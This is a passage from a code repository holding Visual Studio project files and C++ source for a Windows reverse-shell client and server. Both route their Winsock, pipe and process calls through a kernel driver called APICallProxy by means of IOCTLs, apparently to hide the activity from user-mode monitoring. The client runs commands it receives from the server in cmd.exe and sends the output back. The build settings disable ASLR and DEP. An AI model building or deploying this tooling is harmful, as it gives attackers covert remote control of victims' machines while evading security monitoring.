  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>
      </FunctionLevelLinking>
      <IntrinsicFunctions>false</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <DebugInformationFormat>None</DebugInformationFormat>
      <Optimization>Disabled</Optimization>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeTypeInfo>false</RuntimeTypeInfo>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>
      </EnableCOMDATFolding>
      <OptimizeReferences>
      </OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <LinkTimeCodeGeneration />
      <RandomizedBaseAddress>false</RandomizedBaseAddress>
      <FixedBaseAddress>true</FixedBaseAddress>
      <DataExecutionPrevention>false</DataExecutionPrevention>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/ReverseShellClient/ReverseShellClient.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`APICallProxy/ReverseShellClient/main.cpp`:

```cpp
#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h> 
#include <tchar.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>

#include <winioctl.h>


#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")

#define BUFSIZE 4096 
#define DEFAULT_BUFLEN 512

#pragma warning(disable : 4996)

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;


CHAR CommandResult[BUFSIZE * 100] = { 0 };

HANDLE hDevice = NULL;

VOID CreateChildProcess();
VOID WriteToPipe(CHAR* Buffer, int BufferLen);
VOID ReadFromPipe();

int _tmain(int argc, TCHAR* argv[])
{

    BOOL Status = 1;
    DWORD returned;
    WSAStartCleanUp  WSAInfo = { 0 };
    SocketStruct	 SocketInfo = { 0 };
    SendRecvStruct	 SendInfo = { 0 };
    BindStruct		 BindInfo = { 0 };
    AcceptStruct	 AcceptInfo = { 0 };
    ConnectStruct	 ConnectInfo = { 0 };

    hDevice = CreateFileA("\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, FALSE, OPEN_EXISTING, 0, FALSE);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
        return 0;
    }


    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSAStartup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to initiates Winsock Error Code: 0x%x\n", GetLastError());
        return 0;
    }

    printf("[+] initiates of the Winsock Successfully\n");


    SocketInfo.WSAStartCleanUpptr.WskDispatchPtr = WSAInfo.WskDispatchPtr;
    SocketInfo.WSAStartCleanUpptr.WskProviderPtr = WSAInfo.WskProviderPtr;
    SocketInfo.WSAStartCleanUpptr.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

#define WSK_FLAG_BASIC_SOCKET        0x00000000
#define WSK_FLAG_LISTEN_SOCKET       0x00000001
#define WSK_FLAG_CONNECTION_SOCKET   0x00000002
#define WSK_FLAG_DATAGRAM_SOCKET     0x00000004
#define WSK_FLAG_STREAM_SOCKET       0x00000008

    SocketInfo.Domain = AF_INET;
    SocketInfo.Flags = WSK_FLAG_CONNECTION_SOCKET;
    SocketInfo.Protocol = IPPROTO_TCP;
    SocketInfo.Type = SOCK_STREAM;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Socket, &SocketInfo, sizeof(SocketStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Create Connection Socket Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Created Connection Socket Successfully\n");


    GetAddrInfoStruct AddrInfo = { 0 };
    struct addrinfo hints = { 0 };
    struct addrinfo* res;

    hints.ai_flags = AI_CANONNAME;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    CHAR Node[] = "127.0.0.1";
    CHAR Service[] = "9090";

    AddrInfo.Hints = &hints;
    AddrInfo.Result = &res;
    AddrInfo.Node = Node;
    AddrInfo.Service = Service;

    AddrInfo.SocketInfo.WskDispatchPtr = WSAInfo.WskDispatchPtr;
    AddrInfo.SocketInfo.WskProviderPtr = WSAInfo.WskProviderPtr;
    AddrInfo.SocketInfo.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_GetAddrInfo, &AddrInfo, sizeof(GetAddrInfoStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to Rsolve Server Addres Error Code: 0x%x\n", GetLastError());
        return 0;
    }

    printf("[+] Server Address Resolved Successfully\n");


    ConnectInfo.Socket = SocketInfo.Socket;
    ConnectInfo.AddrInfo = res;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Connect, &ConnectInfo, sizeof(ConnectStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to Connect To Client Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Connected to Server Successfully\n");

    // Receive until the peer shuts down the connection or recieve exit command
    do {

        SendRecvStruct RecvInfo = { 0 };
        char RecvBuffer[DEFAULT_BUFLEN] = {0};
        RecvInfo.Socket = SocketInfo.Socket;
        RecvInfo.Buffer = RecvBuffer;
        RecvInfo.BufferLen = DEFAULT_BUFLEN;
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Recv, &RecvInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Recive Data From Server Side Error Code: 0x%x\n", GetLastError());
            break;
        }


        printf("[+] Server Command: %s\n", RecvBuffer);

        char Exit[] = "exit";
        if (!strcmp(RecvBuffer, Exit)) {

            printf("Exit the Session!!\n");
            break;
        }

        char newline[2] = { '\n' ,0x0 };
        strcat(RecvBuffer, newline);
        

        SECURITY_ATTRIBUTES saAttr;

        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
            printf("[-] Failed CreatePipe to write to child process Error Code %x\n", GetLastError()); ;


        if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
            printf("[-] Failed SetHandleInformation Error Code %x\n", GetLastError()); ;


        if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
            printf("[-] Failed CreatePipe to read from output from child process Error Code %x\n", GetLastError()); ;


        if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
            printf("[-] Failed SetHandleInformation Error Code %x\n", GetLastError());

        // Create the child process. 
        CreateChildProcess();

        //write command to child process
        WriteToPipe(RecvBuffer, strlen(RecvBuffer));

        //read command result from the child process
        ReadFromPipe();

        //send the command result to the seriver
        SendInfo.Socket = SocketInfo.Socket;
        SendInfo.Buffer = CommandResult;
        SendInfo.BufferLen = strlen(CommandResult);
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Send, &SendInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed to Replay to the Server Error Code: 0x%x\n", GetLastError());
            break;
        }

       
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_OUT_Rd, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
        }

        Sleep(500);


    } while (1);


CleanUp:

    if (SocketInfo.Socket != NULL) {
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CloseSocket, &SocketInfo.Socket, sizeof(PVOID), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed Close Socket Error Code: 0x%x\n", GetLastError());
        }
    }

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSACleanup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Terminates use of the Winsock Error Code: 0x%x\n", GetLastError());
    }

    return 0;
}

VOID CreateChildProcess() {
    TCHAR szCmdline[] = TEXT("cmd.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    // Set up members of the PROCESS_INFORMATION structure. 

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 

    bSuccess = CreateProcess(NULL,
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION 

     // If an error occurs, exit the application. 
    if (!bSuccess)
        printf("[-] Failed Creating Process Error Code %x\n", GetLastError());
    else {

        DWORD returned;
        BOOL Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &piProcInfo.hProcess, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Process handle Error Code: 0x%x\n", GetLastError());
        }
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &piProcInfo.hThread, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Main Thread handle Error Code: 0x%x\n", GetLastError());
        }
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_OUT_Wr, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
        }
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_IN_Rd, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
        }

    }
}

VOID WriteToPipe(CHAR* Buffer, int BufferLen) {
    DWORD  dwWritten;
    BOOL bSuccess = FALSE;
    DWORD returned;
    BOOL Status;

    ReadWriteData PipeDate = { 0 };
    PipeDate.FileHandle = g_hChildStd_IN_Wr;
    PipeDate.DataLen = BufferLen;
    PipeDate.Data = Buffer;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITEFILE, &PipeDate, sizeof(ReadWriteData), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed Writing Command To Pipe Error Code: 0x%x\n", GetLastError());
    }

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_IN_Wr, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
    }
}

VOID ReadFromPipe() {
    DWORD dwRead;
    CHAR ResultTempBuffer[BUFSIZE] = { 0 };
    BOOL bSuccess = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    DWORD returned;
    BOOL Status;

    RtlZeroMemory(CommandResult, BUFSIZE * 100);

    for (;;){

        ReadWriteData PipeDate = { 0 };
        CHAR ResultTempBuffer[BUFSIZE] = { 0 };
        PipeDate.FileHandle = g_hChildStd_OUT_Rd;
        PipeDate.Data = ResultTempBuffer;
        PipeDate.DataLen = BUFSIZE;
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_READFILE, &PipeDate, sizeof(ReadWriteData), NULL, NULL, &returned, FALSE);
        if (!Status) {
            //Finished Reading CMD command output
            break;
        }
        Sleep(200);
        strcat(CommandResult, ResultTempBuffer);
    }


}

```

`APICallProxy/ReverseShellServer/ReverseShellServer.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{562688e7-71b3-4d28-9568-8f231240f403}</ProjectGuid>
    <RootNamespace>ReverseShellServer</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>
      </FunctionLevelLinking>
      <IntrinsicFunctions>false</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <CompileAs>CompileAsC</CompileAs>
      <DebugInformationFormat>None</DebugInformationFormat>
      <Optimization>Disabled</Optimization>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeTypeInfo>false</RuntimeTypeInfo>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>
      </EnableCOMDATFolding>
      <OptimizeReferences>
      </OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <LinkTimeCodeGeneration />
      <RandomizedBaseAddress>false</RandomizedBaseAddress>
      <DataExecutionPrevention>false</DataExecutionPrevention>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/ReverseShellServer/ReverseShellServer.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`APICallProxy/ReverseShellServer/main.cpp`:

```cpp
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>

#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"


#pragma comment(lib, "Ws2_32.lib")

#define BUFSIZE 4096 
#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "9093"

int main() {
	

    BOOL Status = 1;
    DWORD returned;
    WSAStartCleanUp  WSAInfo = { 0 };
    SocketStruct	 SocketInfo = { 0 };
    SendRecvStruct	 SendInfo = { 0 };
    BindStruct		 BindInfo = { 0 };
    AcceptStruct	 AcceptInfo = { 0 };
    HANDLE           hDevice = NULL;


    hDevice = CreateFileA("\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, FALSE, OPEN_EXISTING, 0, FALSE);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
        return 0;
    }

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSAStartup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to initiates Winsock Error Code: 0x%x\n", GetLastError());
        return 0;
    }

    printf("[+] initiates of the Winsock Successfully\n");

    SocketInfo.WSAStartCleanUpptr.WskDispatchPtr = WSAInfo.WskDispatchPtr;
    SocketInfo.WSAStartCleanUpptr.WskProviderPtr = WSAInfo.WskProviderPtr;
    SocketInfo.WSAStartCleanUpptr.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

#define WSK_FLAG_BASIC_SOCKET        0x00000000
#define WSK_FLAG_LISTEN_SOCKET       0x00000001
#define WSK_FLAG_CONNECTION_SOCKET   0x00000002
#define WSK_FLAG_DATAGRAM_SOCKET     0x00000004
#define WSK_FLAG_STREAM_SOCKET       0x00000008

    SocketInfo.Domain = AF_INET;
    SocketInfo.Flags = WSK_FLAG_LISTEN_SOCKET;
    SocketInfo.Protocol = IPPROTO_TCP;
    SocketInfo.Type = SOCK_STREAM;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Socket, &SocketInfo, sizeof(SocketStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Create Listen Socket Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Created Listen Socket Successfully\n");


    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9090);

    BindInfo.Socket = SocketInfo.Socket;
    BindInfo.Address = &addr;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Bind, &BindInfo, sizeof(BindStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to Bind Socket Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Binding Socket Successfully\n");


    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_listen, NULL, NULL, NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to Listen on Socket Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Listen on Socket Successfully\n");

    INT SocLen = 0;
    AcceptInfo.Socket = SocketInfo.Socket;
    AcceptInfo.Address = &addr;
    AcceptInfo.SocketLen = &SocLen;

